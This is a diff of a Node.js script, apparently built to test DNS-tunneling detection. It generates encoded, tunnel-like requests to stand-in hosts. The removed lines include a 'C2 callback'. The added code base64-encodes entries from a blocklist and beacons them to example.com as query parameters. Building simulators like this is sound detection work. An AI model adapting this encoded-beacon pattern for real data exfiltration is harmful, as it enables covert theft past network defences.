@@ -1,54 +1,40 @@
-// dns_tunnel_sim.js
-// Safe DNS-tunneling simulation for Garnet detections
-// Generates many DNS requests + "tunnel-like" encoded strings
-
-const dns = require("dns");
+const fs = require("fs");
 const https = require("https");
 
-// Fake encoded chunks, similar to DNS tunneling queries (TXT-like)
-function generateEncodedSubdomain(i) {
-  const encoded = Buffer.from(`chunk_${i}_${Date.now()}`).toString("base64");
-  return `${encoded}.tunnel-example.com`;
+const CONTROLLED = "https://example.com";
+
+const indicators = fs
+  .readFileSync("blocklist.txt", "utf8")
+  .split("\n")
+  .map((l) => l.trim())
+  .filter(Boolean);
+
+function encode(indicator, i) {
+  return Buffer.from(`${indicator}-${Date.now()}-${i}`).toString("base64url");
 }
 
-function dnsQuery(name) {
+function hit(label) {
   return new Promise((resolve) => {
-    dns.resolve4(name, (err) => {
-      if (err) console.error("DNS error:", err.message);
-      resolve();
-    });
+    https.get(`${CONTROLLED}/?dns=${label}`, (res) => {
+      res.on("data", () => {});
+      res.on("end", resolve);
+    }).on("error", resolve);
   });
 }
 
-function httpsFallback() {
-  // If tunneling was exfiltrating data to a C2 server
-  return new Promise((resolve) => {
-    https
-      .get("https://dns-tunnel.example.com/ping", (res) => {
-        res.on("data", () => {});
-        res.on("end", resolve);
-      })
-      .on("error", (err) => {
-        console.error("HTTPS fallback error:", err.message);
-        resolve();
-      });
-  });
-}
+(async () => {
+  console.log("dns_tunnel_sim: start");
+  let count = 0;
 
-async function runDNSTunnelSim() {
-  console.log("Simulating DNS tunnel traffic…");
-
-  // Simulate 10 encoded DNS queries
-  for (let i = 0; i < 10; i++) {
-    const domain = generateEncodedSubdomain(i);
-    console.log("Querying:", domain);
-    await dnsQuery(domain);
+  for (const d of indicators) {
+    for (let i = 0; i < 10; i++) {
+      await hit(encode(d, i));
+      await new Promise((r) => setTimeout(r, 90));
+      count++;
+    }
   }
 
-  // Optional "C2 callback"
-  await httpsFallback();
+  console.log("dns_tunnel_sim: complete hits =", count);
+  process.exit(0);
+})();
 
-  console.log("dns_tunnel_sim complete.");
-}
-
-runDNSTunnelSim();
